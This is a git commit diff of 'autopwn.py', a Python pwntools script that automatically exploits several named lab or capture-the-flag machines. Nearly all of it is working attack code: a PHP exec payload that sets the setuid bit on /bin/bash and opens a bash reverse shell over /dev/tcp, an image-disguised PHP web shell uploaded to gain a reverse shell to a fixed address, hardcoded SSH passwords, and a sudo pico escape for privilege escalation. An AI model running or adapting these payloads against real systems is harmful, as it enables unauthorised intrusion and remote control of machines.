428d44e8a6fa9ff318c64c332d25ed625adb59b0
Uugana <65070195+uug4na@users.noreply.github.com>
2022-07-26 21:05:47 +0800

    argv and added fortune kekw

--- autopwn.py
+++ autopwn.py
@@ -2,15 +2,14 @@ from pwn import *
 import requests
 import os
 import ftplib
-import base64
-import json
+import pyautogui
 
 # machineName = input("Enter Machine Name: ")
 sess = requests.session()
-
+usage = f"Usage: {sys.argv[0]} <Machine Name> <Machine Ip>"
 # -------------------------------------------------- Tyler -------------------------------------------------- #
 def Tyler():
-    global sess
+    global sess, ip
     ip = input("Enter Machine Ip: ")
     response = os.system(f"ping -c 1 {ip} > /dev/null")
     if response == 0:
@@ -42,6 +41,7 @@ def Tyler():
 
 # -------------------------------------------------- Production -------------------------------------------------- #
 def Production():
+    global ip
     print("Please Add Machine Ip To Your '/etc/hosts'")
     input("[*] Press Enter To Continue")
     username = "anonymous"
@@ -69,7 +69,7 @@ def Production():
     
 # -------------------------------------------------- Shrek -------------------------------------------------- #
 def Shrek():
-    ip = input("Enter Machine Ip: ")
+    global ip
     os.system(f"wget {ip}/Cpxtpt2hWCee9VFa.txt 2>/dev/null; mv Cpxtpt2hWCee9VFa.txt key; chmod 600 key")
     req = ssh(host=ip, user='shrek', keyfile='key')
     shell = req.process("/bin/sh")
@@ -80,10 +80,10 @@ def Shrek():
 # -------------------------------------------------- H1 - Easy -------------------------------------------------- #
 
 def H1():
-    global sess
+    global sess, ip
     userIp = input("Enter Your Ip: ")
     port = input("Enter Listening Port: ")
-    payload = f"""exec("echo 'chmod 4777 /bin/bash' >> /home/serv3/backups/backup.sh;/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'");"""
+    payload = f"""exec("echo 'chmod 4777 /bin/bash' >> /home/serv3/backups/backup.sh;/bin/bash -c 'bash -i >& /dev/tcp/{userIp}/{port} 0>&1'");"""
     data = {
         "code" : payload
     }
@@ -95,16 +95,72 @@ def H1():
     else:
         print("[!] Server Error")
         exit()
-        
+
+# -------------------------------------------------- Panda -------------------------------------------------- #
+def Panda():
+    global ip
+    req = ssh(host="10.10.222.47", user="shifu", password="batman")
+    shell = req.process("/bin/sh")
+    shell.interactive()
+
+
+def Carnage():
+    global sess, ip
+    payload = f"""GIF89a;
+<?php
+exec("/bin/bash -c 'bash -i > /dev/tcp/10.8.71.139/1234 0>&1'");
+"""
+    with open('payload.gif.php', 'w') as f:
+        f.write(payload)
+    files = {
+        "Content-Disposition": 'form-data; name="file"; filename="payload.gif.php"',
+        "file" : open('payload.gif.php', 'rb')
+    }
+    values = {
+        "Content-Disposition": '"form-data; name="MAX_FILE_SIZE"',
+        "filename" : "payload.gif.php"
+    }
+    send = sess.post(f"http://{ip}:82/upload.php", files=files, data=values, allow_redirects=True)
+    if(send.status_code == 200):
+        print("[*] Payload Sent")
+        check = sess.get(f"http://{ip}:82/images/")
+        print(check.text)
+
+def Fortune():
+    global sess, ip
+    req = ssh(host=ip, user="fortuna", password="NjFiZWIyMG")
+    print("""PRIVESC: "Its needed to keyboard and i couldnt find a way to do it with the shell sry but its on todo.txt:/"
+>sudo pico
+>passwd: "NjFiZWIyMG"
+>CTRL + R, CTRL + X
+>reset; sh 1>&0 2>&0
+""")
+    shell = req.process("/bin/sh")
+    time.sleep(1)
+    shell.interactive()
 
 if __name__ == "__main__":
-    Production()
-    # if machineName == "Tyler" or machineName == "tyler":
-    #     Tyler()
-    # if machineName == "Production" or machineName == "production":
-    #     Production()
-    # if machineName == "Shrek" or machineName == "shrek":
-    #     Shrek()
-    # else:
-    #     print("[!] Invalid Machine Name")
-    #     exit()
+    
+    machineName = sys.argv[1]
+    ip = sys.argv[2]
+
+    if len(sys.argv) < 3:
+        print(usage)
+    else:
+        if machineName == "Tyler" or machineName == "tyler":
+            Tyler()
+        if machineName == "Production" or machineName == "production":
+            Production()
+        if machineName == "Shrek" or machineName == "shrek":
+            Shrek()
+        if machineName == "Panda" or machineName == "panda":
+            Panda()
+        if machineName == "H1" or machineName == "h1":
+            H1()
+        if machineName == "Carnage" or machineName == "carnage":
+            Carnage()
+        if machineName == "Fortune" or machineName == "fortune":
+            Fortune()
+        else:
+            print("[!] Invalid Machine Name")
+            exit()
